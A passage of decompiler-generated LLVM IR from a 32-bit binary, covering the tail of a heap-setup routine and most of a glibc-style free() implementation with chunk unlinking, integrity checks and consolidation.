  %v2_8060ae9 = add i32 %v1_8060ae9, 8
  %v3_8060ae9 = inttoptr i32 %v2_8060ae9 to i32*
  store i32 %v0_8060ae9, i32* %v3_8060ae9, align 4
  %v0_8060af7.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8060aec

dec_label_pc_8060aec:                             ; preds = %dec_label_pc_8060aaf, %dec_label_pc_8060ae4
  %v1_8060b00 = phi i32 [ %v2_8060ac0, %dec_label_pc_8060aaf ], [ %v0_8060af7.pre, %dec_label_pc_8060ae4 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8060af4 = and i32 %v3_8060ac3, -4
  store i32 %v1_8060af4, i32* @ebp, align 4
  %v4_8060af7 = load i32, i32* %v3_8060b5a, align 4
  %v15_8060af7 = icmp eq i32 %v1_8060b00, %v4_8060af7
  br i1 %v15_8060af7, label %dec_label_pc_8060b4d, label %dec_label_pc_8060afc

dec_label_pc_8060afc:                             ; preds = %dec_label_pc_8060aec
  %v2_8060afc = add i32 %v1_8060b00, 4
  %v3_8060afc = add i32 %v2_8060afc, %v1_8060af4
  %v4_8060afc = inttoptr i32 %v3_8060afc to i32*
  %v5_8060afc = load i32, i32* %v4_8060afc, align 4
  store i32 %v5_8060afc, i32* %eax.global-to-local, align 4
  %v3_8060b00 = inttoptr i32 %v2_8060afc to i32*
  store i32 %v1_8060af4, i32* %v3_8060b00, align 4
  %v0_8060b03 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060b03 = urem i32 %v0_8060b03, 2
  %v2_8060b03 = icmp eq i32 %v1_8060b03, 0
  store i32 %v1_8060b03, i32* %eax.global-to-local, align 4
  %v1_8060b08 = icmp eq i1 %v2_8060b03, false
  br i1 %v1_8060b08, label %dec_label_pc_8060b29, label %dec_label_pc_8060b0a

dec_label_pc_8060b0a:                             ; preds = %dec_label_pc_8060afc
  %v0_8060b0a = load i32, i32* @ebx, align 4
  %v1_8060b0a = add i32 %v0_8060b0a, 8
  %v2_8060b0a = inttoptr i32 %v1_8060b0a to i32*
  %v3_8060b0a = load i32, i32* %v2_8060b0a, align 4
  store i32 %v3_8060b0a, i32* @edx, align 4
  %v1_8060b0d = add i32 %v0_8060b0a, 12
  %v2_8060b0d = inttoptr i32 %v1_8060b0d to i32*
  %v3_8060b0d = load i32, i32* %v2_8060b0d, align 4
  store i32 %v3_8060b0d, i32* %eax.global-to-local, align 4
  %v1_8060b10 = add i32 %v3_8060b0a, 12
  %v2_8060b10 = inttoptr i32 %v1_8060b10 to i32*
  %v3_8060b10 = load i32, i32* %v2_8060b10, align 4
  store i32 %v3_8060b10, i32* @esi, align 4
  %v12_8060b13 = icmp eq i32 %v3_8060b10, %v0_8060b0a
  %v1_8060b15 = icmp eq i1 %v12_8060b13, false
  br i1 %v1_8060b15, label %dec_label_pc_8060b1c, label %dec_label_pc_8060b17

dec_label_pc_8060b17:                             ; preds = %dec_label_pc_8060b0a
  %v1_8060b17 = add i32 %v3_8060b0d, 8
  %v2_8060b17 = inttoptr i32 %v1_8060b17 to i32*
  %v3_8060b17 = load i32, i32* %v2_8060b17, align 4
  %v15_8060b17 = icmp eq i32 %v3_8060b17, %v3_8060b10
  br i1 %v15_8060b17, label %dec_label_pc_8060b21, label %dec_label_pc_8060b1c

dec_label_pc_8060b1c:                             ; preds = %dec_label_pc_8060b17, %dec_label_pc_8060b0a, %dec_label_pc_8060adf, %dec_label_pc_8060acc
  %v0_8060b1c = call i32 @abort()
  store i32 %v0_8060b1c, i32* %eax.global-to-local, align 4
  %v1_8060b23.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8060b21

dec_label_pc_8060b21:                             ; preds = %dec_label_pc_8060b17, %dec_label_pc_8060b1c
  %v1_8060b23 = phi i32 [ %v3_8060b0a, %dec_label_pc_8060b17 ], [ %v1_8060b23.pre, %dec_label_pc_8060b1c ]
  %v0_8060b23 = phi i32 [ %v3_8060b0d, %dec_label_pc_8060b17 ], [ %v0_8060b1c, %dec_label_pc_8060b1c ]
  %v0_8060b21 = load i32, i32* @edi, align 4
  %v1_8060b21 = load i32, i32* @ebp, align 4
  %v2_8060b21 = add i32 %v1_8060b21, %v0_8060b21
  store i32 %v2_8060b21, i32* @edi, align 4
  %v2_8060b23 = add i32 %v1_8060b23, 12
  %v3_8060b23 = inttoptr i32 %v2_8060b23 to i32*
  store i32 %v0_8060b23, i32* %v3_8060b23, align 4
  %v0_8060b26 = load i32, i32* @edx, align 4
  %v1_8060b26 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060b26 = add i32 %v1_8060b26, 8
  %v3_8060b26 = inttoptr i32 %v2_8060b26 to i32*
  store i32 %v0_8060b26, i32* %v3_8060b26, align 4
  br label %dec_label_pc_8060b29

dec_label_pc_8060b29:                             ; preds = %dec_label_pc_8060afc, %dec_label_pc_8060b21
  store i32 %v1_8060a74, i32* %eax.global-to-local, align 4
  %v3_8060b2d = load i32, i32* %v2_8060b2d, align 4
  store i32 %v3_8060b2d, i32* %edx.global-to-local, align 4
  %v0_8060b30 = load i32, i32* @ecx, align 4
  store i32 %v0_8060b30, i32* %v2_8060b2d, align 4
  %v0_8060b33 = load i32, i32* @edi, align 4
  %v1_8060b35 = or i32 %v0_8060b33, 1
  %v1_8060b38 = load i32, i32* @ecx, align 4
  %v2_8060b38 = add i32 %v1_8060b38, 4
  %v3_8060b38 = inttoptr i32 %v2_8060b38 to i32*
  store i32 %v1_8060b35, i32* %v3_8060b38, align 4
  %v0_8060b3b = load i32, i32* @ecx, align 4
  %v1_8060b3b = load i32, i32* %edx.global-to-local, align 4
  %v2_8060b3b = add i32 %v1_8060b3b, 12
  %v3_8060b3b = inttoptr i32 %v2_8060b3b to i32*
  store i32 %v0_8060b3b, i32* %v3_8060b3b, align 4
  store i32 %v1_8060a74, i32* %eax.global-to-local, align 4
  %v0_8060b42 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060b42 = load i32, i32* @ecx, align 4
  %v2_8060b42 = add i32 %v1_8060b42, 8
  %v3_8060b42 = inttoptr i32 %v2_8060b42 to i32*
  store i32 %v0_8060b42, i32* %v3_8060b42, align 4
  %v0_8060b45 = load i32, i32* @edi, align 4
  %v1_8060b45 = load i32, i32* @ecx, align 4
  %v3_8060b45 = add i32 %v1_8060b45, %v0_8060b45
  %v4_8060b45 = inttoptr i32 %v3_8060b45 to i32*
  store i32 %v0_8060b45, i32* %v4_8060b45, align 4
  %v0_8060b48 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060b48 = load i32, i32* @ecx, align 4
  %v2_8060b48 = add i32 %v1_8060b48, 12
  %v3_8060b48 = inttoptr i32 %v2_8060b48 to i32*
  store i32 %v0_8060b48, i32* %v3_8060b48, align 4
  br label %dec_label_pc_8060b5d

dec_label_pc_8060b4d:                             ; preds = %dec_label_pc_8060aec
  %v0_8060b4d = load i32, i32* @edi, align 4
  %v2_8060b4d = add i32 %v0_8060b4d, %v1_8060af4
  %v1_8060b50 = or i32 %v2_8060b4d, 1
  store i32 %v1_8060b50, i32* %eax.global-to-local, align 4
  %v1_8060b53 = load i32, i32* @ecx, align 4
  %v2_8060b53 = add i32 %v1_8060b53, 4
  %v3_8060b53 = inttoptr i32 %v2_8060b53 to i32*
  store i32 %v1_8060b50, i32* %v3_8060b53, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_8060b5a = load i32, i32* @ecx, align 4
  store i32 %v0_8060b5a, i32* %v3_8060b5a, align 4
  br label %dec_label_pc_8060b5d

dec_label_pc_8060b5d:                             ; preds = %dec_label_pc_8060b29, %dec_label_pc_8060b4d
  store i32 %v3_8060aaf, i32* @ecx, align 4
  %v1_8060b61 = icmp eq i32 %v3_8060aaf, 0
  %v1_8060b63 = icmp eq i1 %v1_8060b61, false
  br i1 %v1_8060b63, label %dec_label_pc_8060aaf, label %dec_label_pc_8060b69

dec_label_pc_8060b69:                             ; preds = %dec_label_pc_8060b5d, %dec_label_pc_8060a9b
  store i32 %v4_8060a93, i32* @ecx, align 4
  %v15_8060b6d = icmp eq i32 %v0_8060aa9, %v4_8060a93
  br i1 %v15_8060b6d, label %dec_label_pc_8060bf1, label %dec_label_pc_8060b73

dec_label_pc_8060b73:                             ; preds = %dec_label_pc_8060b69
  br label %dec_label_pc_8060a9b

dec_label_pc_8060b7d:                             ; preds = %dec_label_pc_8060b8c.preheader, %dec_label_pc_8060b7d
  %v1_8060b8120 = phi i32 [ 1, %dec_label_pc_8060b8c.preheader ], [ %v0_8060b8c.pre, %dec_label_pc_8060b7d ]
  %v2_8060b81 = mul i32 %v1_8060b8120, 8
  %v4_8060b81 = add i32 %v3_8060b81, %v2_8060b81
  store i32 %v4_8060b81, i32* %eax.global-to-local, align 4
  %v1_8060b85 = add i32 %v1_8060b8120, 1
  store i32 %v1_8060b85, i32* %edx.global-to-local, align 4
  %v2_8060b86 = add i32 %v4_8060b81, 12
  %v3_8060b86 = inttoptr i32 %v2_8060b86 to i32*
  store i32 %v4_8060b81, i32* %v3_8060b86, align 4
  %v0_8060b89 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060b89 = add i32 %v0_8060b89, 8
  %v3_8060b89 = inttoptr i32 %v2_8060b89 to i32*
  store i32 %v0_8060b89, i32* %v3_8060b89, align 4
  %v0_8060b8c.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8060b8f = icmp sgt i32 %v0_8060b8c.pre, 95
  br i1 %v7_8060b8f, label %dec_label_pc_8060b91, label %dec_label_pc_8060b7d

dec_label_pc_8060b91:                             ; preds = %dec_label_pc_8060b7d
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8060b95 = add i32 %tmp11, 864
  %v2_8060b95 = inttoptr i32 %v1_8060b95 to i32*
  %v3_8060b95 = load i32, i32* %v2_8060b95, align 4
  %v4_8060b95 = or i32 %v3_8060b95, 1
  store i32 %v4_8060b95, i32* %v2_8060b95, align 4
  %v0_8060b9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8060b9c = add i32 %v0_8060b9c, 840
  %v2_8060b9c = inttoptr i32 %v1_8060b9c to i32*
  store i32 0, i32* %v2_8060b9c, align 4
  %v0_8060ba6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060ba6 = add i32 %v0_8060ba6, 852
  %v2_8060ba6 = inttoptr i32 %v1_8060ba6 to i32*
  store i32 65536, i32* %v2_8060ba6, align 4
  %v0_8060bb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060bb0 = add i32 %v0_8060bb0, 844
  %v2_8060bb0 = inttoptr i32 %v1_8060bb0 to i32*
  store i32 262144, i32* %v2_8060bb0, align 4
  %v0_8060bba = load i32, i32* %eax.global-to-local, align 4
  %v1_8060bba = add i32 %v0_8060bba, 836
  %v2_8060bba = inttoptr i32 %v1_8060bba to i32*
  store i32 262144, i32* %v2_8060bba, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8060bcb = load i32, i32* %arg1, align 4
  %v1_8060bcd = urem i32 %v2_8060bcb, 4
  %v1_8060bd0 = or i32 %v1_8060bcd, 72
  store i32 %v1_8060bd0, i32* %arg1, align 4
  %v1_8060bd7 = add i32 %tmp11, 52
  store i32 %v1_8060bd7, i32* %eax.global-to-local, align 4
  %v2_8060bda = add i32 %tmp11, 44
  %v3_8060bda = inttoptr i32 %v2_8060bda to i32*
  store i32 %v1_8060bd7, i32* %v3_8060bda, align 4
  %v1_8060bdf = call i32 @sysconf(i32 30)
  store i32 %v1_8060bdf, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8060beb = add i32 %tmp11, 860
  %v3_8060beb = inttoptr i32 %v2_8060beb to i32*
  store i32 %v1_8060bdf, i32* %v3_8060beb, align 4
  br label %dec_label_pc_8060bf1

dec_label_pc_8060bf1:                             ; preds = %dec_label_pc_8060b69, %dec_label_pc_8060b91
  store i32 %v0_8060a54, i32* @ebx, align 4
  store i32 %v0_8060a53, i32* @esi, align 4
  store i32 %v0_8060a52, i32* @edi, align 4
  store i32 %v0_8060a51, i32* @ebp, align 4
  %v0_8060bf8 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8060bf8

; uselistorder directives
  uselistorder i32 %v0_8060b89, { 1, 0 }
  uselistorder i32 %v0_8060b45, { 1, 0 }
  uselistorder i32 %v1_8060b03, { 1, 0 }
  uselistorder i32 %v2_8060afc, { 1, 0 }
  uselistorder i32 %v1_8060af4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8060b00, { 1, 0 }
  uselistorder i32 %v3_8060aaf, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8060acc, { 2, 1, 0, 4, 3 }
  uselistorder i32* %v3_8060b5a, { 1, 0 }
  uselistorder i32 %tmp11, { 6, 16, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %eax.global-to-local, { 22, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 13, 14, 17, 18, 19, 20, 21, 23, 24, 25 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8060bf1, { 1, 0 }
  uselistorder label %dec_label_pc_8060b7d, { 1, 0 }
  uselistorder label %dec_label_pc_8060b5d, { 1, 0 }
  uselistorder label %dec_label_pc_8060b29, { 1, 0 }
  uselistorder label %dec_label_pc_8060b21, { 1, 0 }
  uselistorder label %dec_label_pc_8060aec, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8060bf9 = load i32, i32* @ebp, align 4
  %v0_8060bfa = load i32, i32* @edi, align 4
  %v0_8060bfb = load i32, i32* @esi, align 4
  %v0_8060bfc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8060c04 = icmp eq i32 %arg1, 0
  br i1 %v1_8060c04, label %dec_label_pc_8060d8d, label %dec_label_pc_8060c0c

dec_label_pc_8060c0c:                             ; preds = %entry
  %v2_8060c17 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8060c17, i32* %eax.global-to-local, align 4
  %v4_8060c1c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134589241, i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  store i32 %v4_8060c1c, i32* %eax.global-to-local, align 4
  %v1_8060c28 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075530.598 to i32))
  %v1_8060c2d = add i32 %arg1, -8
  store i32 %v1_8060c2d, i32* @ecx, align 4
  %v0_8060c30 = load i8, i8* @global_var_807f400.681, align 1
  %v1_8060c30 = sext i8 %v0_8060c30 to i32
  store i32 %v1_8060c30, i32* %eax.global-to-local, align 4
  %v1_8060c35 = add i32 %arg1, -4
  %v2_8060c35 = inttoptr i32 %v1_8060c35 to i32*
  %v3_8060c35 = load i32, i32* %v2_8060c35, align 4
  store i32 %v3_8060c35, i32* %edx.global-to-local, align 4
  %v1_8060c3d = and i32 %v3_8060c35, -4
  %v4_8060c3d = trunc i32 %v1_8060c3d to i8
  store i32 %v1_8060c3d, i32* @ebx, align 4
  %v8_8060c42 = icmp ugt i8 %v4_8060c3d, %v0_8060c30
  br i1 %v8_8060c42, label %dec_label_pc_8060c64, label %dec_label_pc_8060c44

dec_label_pc_8060c44:                             ; preds = %dec_label_pc_8060c0c
  %v1_8060c44 = or i32 %v1_8060c30, 3
  %v3_8060c44 = trunc i32 %v1_8060c44 to i8
  store i32 %v1_8060c44, i32* %eax.global-to-local, align 4
  %v2_8060c47 = udiv i32 %v3_8060c35, 8
  store i32 %v2_8060c47, i32* @ebx, align 4
  store i8 %v3_8060c44, i8* @global_var_807f400.681, align 1024
  %v1_8060c4f = mul nuw i32 %v2_8060c47, 4
  %v2_8060c4f = add i32 %v1_8060c4f, ptrtoint (i8* @global_var_807f400.681 to i32)
  store i32 %v2_8060c4f, i32* %edx.global-to-local, align 4
  %v1_8060c56 = add i32 %v1_8060c4f, add (i32 ptrtoint (i8* @global_var_807f400.681 to i32), i32 -4)
  %v2_8060c56 = inttoptr i32 %v1_8060c56 to i32*
  %v3_8060c56 = load i32, i32* %v2_8060c56, align 4
  store i32 %v3_8060c56, i32* %eax.global-to-local, align 4
  %v3_8060c59 = inttoptr i32 %arg1 to i32*
  store i32 %v3_8060c56, i32* %v3_8060c59, align 4
  %v0_8060c5c = load i32, i32* @ecx, align 4
  %v1_8060c5c = load i32, i32* %edx.global-to-local, align 4
  %v2_8060c5c = add i32 %v1_8060c5c, -4
  %v3_8060c5c = inttoptr i32 %v2_8060c5c to i32*
  store i32 %v0_8060c5c, i32* %v3_8060c5c, align 4
  br label %dec_label_pc_8060d7c

dec_label_pc_8060c64:                             ; preds = %dec_label_pc_8060c0c
  %v2_8060c64 = and i32 %v3_8060c35, 2
  %v3_8060c64 = icmp eq i32 %v2_8060c64, 0
  %v1_8060c67 = icmp eq i1 %v3_8060c64, false
  br i1 %v1_8060c67, label %dec_label_pc_8060d5c, label %dec_label_pc_8060c6d

dec_label_pc_8060c6d:                             ; preds = %dec_label_pc_8060c64
  %v1_8060c6d = or i32 %v1_8060c30, 1
  %v3_8060c6d = trunc i32 %v1_8060c6d to i8
  store i32 %v1_8060c6d, i32* %eax.global-to-local, align 4
  store i8 %v3_8060c6d, i8* @global_var_807f400.681, align 1024
  %v2_8060c75 = add i32 %v1_8060c3d, %v1_8060c2d
  store i32 %v2_8060c75, i32* @esi, align 4
  %v1_8060c78 = add i32 %v2_8060c75, 4
  %v2_8060c78 = inttoptr i32 %v1_8060c78 to i32*
  %v3_8060c78 = load i32, i32* %v2_8060c78, align 4
  store i32 %v3_8060c78, i32* %eax.global-to-local, align 4
  %v2_8060c7f = inttoptr i32 %v1_8060c35 to i8*
  %v3_8060c7f = load i8, i8* %v2_8060c7f, align 1
  %v4_8060c7f = urem i8 %v3_8060c7f, 2
  %v5_8060c7f = icmp eq i8 %v4_8060c7f, 0
  %v1_8060c83 = icmp eq i1 %v5_8060c7f, false
  br i1 %v1_8060c83, label %dec_label_pc_8060ca6, label %dec_label_pc_8060c85

dec_label_pc_8060c85:                             ; preds = %dec_label_pc_8060c6d
  %v2_8060c85 = inttoptr i32 %v1_8060c2d to i32*
  %v3_8060c85 = load i32, i32* %v2_8060c85, align 4
  store i32 %v3_8060c85, i32* @ebp, align 4
  %v2_8060c8a = sub i32 %v1_8060c2d, %v3_8060c85
  store i32 %v2_8060c8a, i32* %eax.global-to-local, align 4
  %v1_8060c8c = add i32 %v2_8060c8a, 8
  %v2_8060c8c = inttoptr i32 %v1_8060c8c to i32*
  %v3_8060c8c = load i32, i32* %v2_8060c8c, align 4
  store i32 %v3_8060c8c, i32* @edi, align 4
  %v1_8060c8f = add i32 %v2_8060c8a, 12
  %v2_8060c8f = inttoptr i32 %v1_8060c8f to i32*
  %v3_8060c8f = load i32, i32* %v2_8060c8f, align 4
  store i32 %v3_8060c8f, i32* %edx.global-to-local, align 4
  %v1_8060c92 = add i32 %v3_8060c8c, 12
  %v2_8060c92 = inttoptr i32 %v1_8060c92 to i32*
  %v3_8060c92 = load i32, i32* %v2_8060c92, align 4
  store i32 %v3_8060c92, i32* @ecx, align 4
  %v12_8060c95 = icmp eq i32 %v3_8060c92, %v2_8060c8a
  %v1_8060c97 = icmp eq i1 %v12_8060c95, false
  br i1 %v1_8060c97, label %dec_label_pc_8060cd5, label %dec_label_pc_8060c99

dec_label_pc_8060c99:                             ; preds = %dec_label_pc_8060c85
  %v1_8060c99 = add i32 %v3_8060c8f, 8
  %v2_8060c99 = inttoptr i32 %v1_8060c99 to i32*
  %v3_8060c99 = load i32, i32* %v2_8060c99, align 4
  %v15_8060c99 = icmp eq i32 %v3_8060c99, %v3_8060c92
  %v1_8060c9c = icmp eq i1 %v15_8060c99, false
  br i1 %v1_8060c9c, label %dec_label_pc_8060cd5, label %dec_label_pc_8060c9e

dec_label_pc_8060c9e:                             ; preds = %dec_label_pc_8060c99
  %v2_8060c9e = add i32 %v3_8060c85, %v1_8060c3d
  store i32 %v2_8060c9e, i32* @ebx, align 4
  store i32 %v3_8060c8f, i32* %v2_8060c92, align 4
  %v0_8060ca3 = load i32, i32* @edi, align 4
  %v1_8060ca3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8060ca3 = add i32 %v1_8060ca3, 8
  %v3_8060ca3 = inttoptr i32 %v2_8060ca3 to i32*
  store i32 %v0_8060ca3, i32* %v3_8060ca3, align 4
  %v0_8060cad.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8060ca6

dec_label_pc_8060ca6:                             ; preds = %dec_label_pc_8060c6d, %dec_label_pc_8060c9e
  %v1_8060cb9 = phi i32 [ %v2_8060c75, %dec_label_pc_8060c6d ], [ %v0_8060cad.pre, %dec_label_pc_8060c9e ]
  %v1_8060caa = and i32 %v3_8060c78, -4
  store i32 %v1_8060caa, i32* @ebp, align 4
  %v1_8060cad = load i32, i32* @global_var_807f42c.682, align 4
  %v12_8060cad = icmp eq i32 %v1_8060cb9, %v1_8060cad
  br i1 %v12_8060cad, label %dec_label_pc_8060d07, label %dec_label_pc_8060cb5

dec_label_pc_8060cb5:                             ; preds = %dec_label_pc_8060ca6
  %v2_8060cb5 = add i32 %v1_8060cb9, 4
  %v3_8060cb5 = add i32 %v2_8060cb5, %v1_8060caa
  %v4_8060cb5 = inttoptr i32 %v3_8060cb5 to i32*
  %v5_8060cb5 = load i32, i32* %v4_8060cb5, align 4
  store i32 %v5_8060cb5, i32* %eax.global-to-local, align 4
  %v3_8060cb9 = inttoptr i32 %v2_8060cb5 to i32*
  store i32 %v1_8060caa, i32* %v3_8060cb9, align 4
  %v0_8060cbc = load i32, i32* %eax.global-to-local, align 4
  %v1_8060cbc = urem i32 %v0_8060cbc, 2
  %v2_8060cbc = icmp eq i32 %v1_8060cbc, 0
  store i32 %v1_8060cbc, i32* %eax.global-to-local, align 4
  %v1_8060cc1 = icmp eq i1 %v2_8060cbc, false
  br i1 %v1_8060cc1, label %dec_label_pc_8060ce2, label %dec_label_pc_8060cc3

dec_label_pc_8060cc3:                             ; preds = %dec_label_pc_8060cb5
  %v0_8060cc3 = load i32, i32* @esi, align 4
  %v1_8060cc3 = add i32 %v0_8060cc3, 8
  %v2_8060cc3 = inttoptr i32 %v1_8060cc3 to i32*
  %v3_8060cc3 = load i32, i32* %v2_8060cc3, align 4
  store i32 %v3_8060cc3, i32* @edx, align 4
  %v1_8060cc6 = add i32 %v0_8060cc3, 12
  %v2_8060cc6 = inttoptr i32 %v1_8060cc6 to i32*
  %v3_8060cc6 = load i32, i32* %v2_8060cc6, align 4
  store i32 %v3_8060cc6, i32* %eax.global-to-local, align 4
  %v1_8060cc9 = add i32 %v3_8060cc3, 12
  %v2_8060cc9 = inttoptr i32 %v1_8060cc9 to i32*
  %v3_8060cc9 = load i32, i32* %v2_8060cc9, align 4
  store i32 %v3_8060cc9, i32* @edi, align 4
  %v12_8060ccc = icmp eq i32 %v3_8060cc9, %v0_8060cc3
  %v1_8060cce = icmp eq i1 %v12_8060ccc, false
  br i1 %v1_8060cce, label %dec_label_pc_8060cd5, label %dec_label_pc_8060cd0

dec_label_pc_8060cd0:                             ; preds = %dec_label_pc_8060cc3
  %v1_8060cd0 = add i32 %v3_8060cc6, 8
  %v2_8060cd0 = inttoptr i32 %v1_8060cd0 to i32*
  %v3_8060cd0 = load i32, i32* %v2_8060cd0, align 4
  %v15_8060cd0 = icmp eq i32 %v3_8060cd0, %v3_8060cc9
  br i1 %v15_8060cd0, label %dec_label_pc_8060cda, label %dec_label_pc_8060cd5

dec_label_pc_8060cd5:                             ; preds = %dec_label_pc_8060cd0, %dec_label_pc_8060cc3, %dec_label_pc_8060c99, %dec_label_pc_8060c85
  %v0_8060cd5 = call i32 @abort()
  store i32 %v0_8060cd5, i32* %eax.global-to-local, align 4
  %v1_8060cda.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8060cda

dec_label_pc_8060cda:                             ; preds = %dec_label_pc_8060cd0, %dec_label_pc_8060cd5
  %v1_8060cda = phi i32 [ %v3_8060cc3, %dec_label_pc_8060cd0 ], [ %v1_8060cda.pre, %dec_label_pc_8060cd5 ]
  %v0_8060cda = phi i32 [ %v3_8060cc6, %dec_label_pc_8060cd0 ], [ %v0_8060cd5, %dec_label_pc_8060cd5 ]
  %v2_8060cda = add i32 %v1_8060cda, 12
  %v3_8060cda = inttoptr i32 %v2_8060cda to i32*
  store i32 %v0_8060cda, i32* %v3_8060cda, align 4
  %v0_8060cdd = load i32, i32* @ebx, align 4
  %v1_8060cdd = load i32, i32* @ebp, align 4
  %v2_8060cdd = add i32 %v1_8060cdd, %v0_8060cdd
  store i32 %v2_8060cdd, i32* @ebx, align 4
  %v0_8060cdf = load i32, i32* @edx, align 4
  %v1_8060cdf = load i32, i32* %eax.global-to-local, align 4
  %v2_8060cdf = add i32 %v1_8060cdf, 8
  %v3_8060cdf = inttoptr i32 %v2_8060cdf to i32*
  store i32 %v0_8060cdf, i32* %v3_8060cdf, align 4
  br label %dec_label_pc_8060ce2

dec_label_pc_8060ce2:                             ; preds = %dec_label_pc_8060cb5, %dec_label_pc_8060cda
  %v0_8060ce2 = load i32, i32* @global_var_807f43c.700, align 4
  store i32 %v0_8060ce2, i32* %eax.global-to-local, align 4
  %v0_8060ce7 = load i32, i32* @ecx, align 4
  %v1_8060ce7 = add i32 %v0_8060ce7, 12
  %v2_8060ce7 = inttoptr i32 %v1_8060ce7 to i32*
  store i32 ptrtoint (i32* @global_var_807f434.684 to i32), i32* %v2_8060ce7, align 4
  %v0_8060cee = load i32, i32* @ebx, align 4
  %v1_8060cee = load i32, i32* @ecx, align 4
  %v3_8060cee = add i32 %v1_8060cee, %v0_8060cee
  %v4_8060cee = inttoptr i32 %v3_8060cee to i32*
  store i32 %v0_8060cee, i32* %v4_8060cee, align 4
  %v0_8060cf1 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060cf1 = load i32, i32* @ecx, align 4
  %v2_8060cf1 = add i32 %v1_8060cf1, 8
  %v3_8060cf1 = inttoptr i32 %v2_8060cf1 to i32*
  store i32 %v0_8060cf1, i32* %v3_8060cf1, align 4
  %v0_8060cf4 = load i32, i32* @ecx, align 4
  %v1_8060cf4 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060cf4 = add i32 %v1_8060cf4, 12
  %v3_8060cf4 = inttoptr i32 %v2_8060cf4 to i32*
  store i32 %v0_8060cf4, i32* %v3_8060cf4, align 4
  %v0_8060cf7 = load i32, i32* @ebx, align 4
  %v1_8060cf9 = or i32 %v0_8060cf7, 1
  store i32 %v1_8060cf9, i32* %eax.global-to-local, align 4
  %v0_8060cfc = load i32, i32* @ecx, align 4
  store i32 %v0_8060cfc, i32* @global_var_807f43c.700, align 4
  %v2_8060d02 = add i32 %v0_8060cfc, 4
  %v3_8060d02 = inttoptr i32 %v2_8060d02 to i32*
  store i32 %v1_8060cf9, i32* %v3_8060d02, align 4
  br label %dec_label_pc_8060d17

dec_label_pc_8060d07:                             ; preds = %dec_label_pc_8060ca6
  %v0_8060d07 = load i32, i32* @ebx, align 4
  %v2_8060d07 = add i32 %v0_8060d07, %v1_8060caa
  store i32 %v2_8060d07, i32* @ebx, align 4
  %v1_8060d0b = or i32 %v2_8060d07, 1
  store i32 %v1_8060d0b, i32* %eax.global-to-local, align 4
  %v1_8060d0e = load i32, i32* @ecx, align 4
  %v2_8060d0e = add i32 %v1_8060d0e, 4
  %v3_8060d0e = inttoptr i32 %v2_8060d0e to i32*
  store i32 %v1_8060d0b, i32* %v3_8060d0e, align 4
  %v0_8060d11 = load i32, i32* @ecx, align 4
  store i32 %v0_8060d11, i32* @global_var_807f42c.682, align 4
  br label %dec_label_pc_8060d17

dec_label_pc_8060d17:                             ; preds = %dec_label_pc_8060ce2, %dec_label_pc_8060d07
  %v0_8060d17 = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_8060d17, 131072
  br i1 %tmp, label %dec_label_pc_8060d7c, label %dec_label_pc_8060d1f

dec_label_pc_8060d1f:                             ; preds = %dec_label_pc_8060d17
  %v0_8060d1f = load i8, i8* @global_var_807f400.681, align 1024
  %v1_8060d1f = and i8 %v0_8060d1f, 2
  %v2_8060d1f = icmp eq i8 %v1_8060d1f, 0
  br i1 %v2_8060d1f, label %dec_label_pc_8060d38, label %dec_label_pc_8060d28

dec_label_pc_8060d28:                             ; preds = %dec_label_pc_8060d1f
  %v2_8060d30 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807f400.681 to i32*))
  store i32 %v2_8060d30, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060d38

dec_label_pc_8060d38:                             ; preds = %dec_label_pc_8060d1f, %dec_label_pc_8060d28
  %v0_8060d38 = load i32, i32* @global_var_807f42c.682, align 4
  store i32 %v0_8060d38, i32* %eax.global-to-local, align 4
  %v1_8060d3d = add i32 %v0_8060d38, 4
  %v2_8060d3d = inttoptr i32 %v1_8060d3d to i32*
  %v3_8060d3d = load i32, i32* %v2_8060d3d, align 4
  %v1_8060d40 = and i32 %v3_8060d3d, -4
  store i32 %v1_8060d40, i32* %eax.global-to-local, align 4
  %v1_8060d43 = load i32, i32* @global_var_807f744.698, align 4
  %v7_8060d43 = icmp ult i32 %v1_8060d40, %v1_8060d43
  br i1 %v7_8060d43, label %dec_label_pc_8060d7c, label %dec_label_pc_8060d4b

dec_label_pc_8060d4b:                             ; preds = %dec_label_pc_8060d38
  %v0_8060d4b = load i32, i32* @global_var_807f748.696, align 8
  store i32 %v0_8060d4b, i32* @eax, align 4
